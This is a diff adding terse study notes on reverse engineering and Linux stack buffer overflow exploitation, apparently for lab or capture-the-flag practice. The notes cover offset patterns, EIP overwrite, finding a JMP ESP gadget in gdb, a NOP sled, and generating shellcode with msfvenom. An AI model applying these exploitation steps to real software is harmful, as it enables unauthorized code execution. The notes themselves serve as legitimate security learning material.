@@ -157,7 +157,57 @@ File > import file > selct.exe > double click imported file
 
 Search > strings: > work from the end m seach for success
 
-##patching
+## patching
 work backwards, look for success > 
 right click > patch intructions
 File > Export 
+
+# Exploit Developement
+
+-fno-stack-protector (vulbnerable to buffer overflow)
+## try passing arguments
+        ./func <<< $(echo "kladlkjasdkajsdlkasd")
+        ./func $(echo "kladlkjasdkajsdlkasd")
+
+## GDB
+    gdb ./file
+    info functions
+    pdisass main
+
+## Steps
+    #!/usr/bin/env python
+    offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+    print (offset)
+or
+    
+    offset = "A" * 62
+        eip = "BBBB" 
+
+        print(offset+eip)
+    
+    run <<<$(python scwipt.py)
+
+    show env
+    unset env LINES
+    unset enc COLUMNS
+
+or
+    
+    offset = "A" * 62
+    eip = "\x59\x3b\xde\xf7" 
+    nop = "\x90" * 15
+    
+    print(offset+eip)
+## run (ctrl+c to crash)
+    info proc map
+    find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4 
+## take first 4 addresses 
+    0xf7de3b59 -> "\x59\x3b\xde\xf7"
+    0xf7f588ab
+    0xf7f645fb
+    0xf7f6460f
+
+msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
+get output add to svupr
+
+    ./func <<<$(python scwipt.py)
